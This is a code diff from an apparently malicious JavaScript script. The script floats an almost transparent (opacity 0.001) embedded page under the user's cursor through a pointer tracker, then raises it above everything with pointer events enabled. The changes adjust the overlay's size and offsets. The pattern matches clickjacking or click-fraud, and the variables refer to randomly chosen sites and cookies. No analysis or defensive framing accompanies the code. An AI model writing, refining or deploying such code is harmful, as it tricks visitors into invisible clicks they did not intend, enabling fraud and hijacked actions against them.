@@ -6,7 +6,7 @@ let sitesRand = [
 let siteSelected = [{link: null, cookie: null}];
 let monitorTracker = null;
 let canTrack = 0;
-let htmlCode = '<div id="_gcli_div"><object id="_gcli_obj" type="text/html" style="position:absolute;width:'+ window.innerWidth +'px;height:'+ window.innerHeight +'px;overflow:hidden"></object></div>';
+let htmlCode = '<div id="_gcli_div"><object id="_gcli_obj" type="text/html" style="position:absolute;width:100%;height:100%;overflow:hidden"></object></div>';
 let cssCode = '<style>#_gcli_div{position:fixed;z-index:-999999;bottom:0;left:0;height:100%;width:100%;opacity:0.001;overflow:hidden;}</style>';
 let pointerTracker = function(e){
     let out = {x:0, y:0};
@@ -70,12 +70,6 @@ function insertCode(){
                 left:  tracker.x - 134,
                 top:   tracker.y - 20
             });
-
-            $('#_gcli_obj').css({
-                width:  window.innerWidth,
-                height:   window.innerHeight,
-                left: - parseInt(window.innerWidth / 2 - 230)
-            });
         }
     });
 
@@ -90,8 +84,8 @@ function showDiv() {
     canTrack = 1;
     startTracker();
 
-    $("#_gcli_obj").css("top", "-110px").css("left", - parseInt(window.innerWidth / 2 - 230)).css("pointer-events", "");
-    $("#_gcli_div").css("width", "728px").css("height", "90px").css("z-index", "999999").css("position", "absolute");
+    $("#_gcli_obj").css("top", "-110px").css("left", "-70px").css("pointer-events", "");
+    $("#_gcli_div").css("width", "780px").css("height", "200px").css("z-index", "999999").css("position", "absolute");
 }
 function showOrMinimize() {
     document.getElementById('_gcli_obj').onload=function(){
